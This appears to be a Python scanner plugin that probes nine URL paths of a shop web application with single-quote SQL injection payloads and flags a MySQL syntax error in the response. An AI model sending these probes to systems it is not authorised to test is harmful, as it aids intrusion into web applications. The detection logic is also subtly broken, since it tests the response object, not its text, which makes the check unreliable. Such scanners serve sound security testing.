#-*- coding:utf-8 -*-
import requests

def check(url):
    results = []
    items = {
        "Url": url, 
        "Vuln": 'information_leak', 
        "Type": None, 
        "Payload": None
    }
    payload1 = '?s=/home/shopcart/getPricetotal/tag/1%27'
    payload2 = '?s=/home/shopcart/getpriceNum/id/1%27'
    payload3 = '?s=/home/user/cut/id/1%27'
    payload4 = '?s=/home/service/index/id/1%27'
    payload5 = '?s=/home/pay/chongzhi/orderid/1%27'
    payload6 = '?s=/home/pay/index/orderid/1%27'
    payload7 = '?s=/home/order/complete/id/1%27'
    payload8 = '?s=/home/order/detail/id/1%27'
    payload9 = '?s=/home/order/cancel/id/1%27'

    try:
        for payload in (payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8,payload9):
            res = requests.get(url + payload)
            if '1064 You have' in res:
                items['Type'] = 'GET'
                items['Payload'] = payload
                results.append(items)
        return results

    except Exception as e:
        return e 

if __name__ == '__main__':
    pass